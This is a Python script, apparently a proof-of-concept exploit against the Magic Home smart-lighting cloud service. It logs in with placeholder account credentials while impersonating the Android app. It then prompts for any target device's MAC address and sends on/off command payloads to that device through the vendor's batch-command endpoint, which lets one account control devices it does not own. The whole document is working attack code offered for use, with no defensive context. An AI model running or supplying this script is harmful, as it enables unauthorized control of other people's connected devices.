#!/usr/local/bin/python3 env
import requests
import json
import sys
import os
from colorama import init
from colorama import Fore, Back, Style
import re
import url64

global found_macaddresses
found_macaddresses = []
global outtahere
outtahere = ""
q = "q"
global token


def turnOn(target, token):
    urlOn = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"
    array = {
        "dataCommandItems":[
            {"hexData":"71230fa3","macAddress":target}
        ]
    }

    data = json.dumps(array)

    headersOn = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "token":token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }

    print (Fore.WHITE + "[+] Sending Payload ...")
    response = requests.post(urlOn, data=data, headers=headersOn)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Endpoint " + Style.RESET_ALL + f"{target}" + Fore.GREEN + " Switched On")
        else:
            print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")

def turnOff(target, token):
    urlOff = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"

    array = {
        "dataCommandItems":[
            {"hexData":"71240fa4","macAddress":target}
        ]
    }

    data = json.dumps(array)
    headersOff = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "token":token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }

    print (Fore.WHITE + "[+] Sending Payload ...")
    response = requests.post(urlOff, data=data, headers=headersOff)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Endpoint " + Style.RESET_ALL + f"{target}" + Fore.GREEN + " Switched Off")
        else:
            print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")

def lighItUp(target, token):
    outtahere = ""
    q = "q"
    if len(str(target)) < 12:
        print (Fore.RED + "[!] Invalid target" + Style.RESET_ALL)
    elif re.match('[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}$', target.lower()):
        while outtahere.lower() != q.lower():
            if outtahere == "0":
                turnOn(target, token)
            elif outtahere == "1":
                turnOff(target, token)
            outtahere = input(Fore.BLUE + "ON/OFF/QUIT ? (0/1/Q): " + Style.RESET_ALL)

def Main():
    urlAuth = "https://wifij01us.magichue.net/app/login/ZG001"

    data = {
        "userID":"<!--Valid User Name-->",
        "password":"<!--Valid Password-->",
        "clientID":""
    }

    headersAuth = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }

    # First Stage Authenticate

    os.system('clear')
    print (Fore.WHITE + "[+] Authenticating ...")
    response = requests.post(urlAuth, json=data, headers=headersAuth)
    resJsonAuth = response.json()
    token = (resJsonAuth['token'])

    target = input(Fore.RED + "Enter a target device mac address: " + Style.RESET_ALL)
    lighItUp(target, token)
            
if __name__ == "__main__":
    Main()
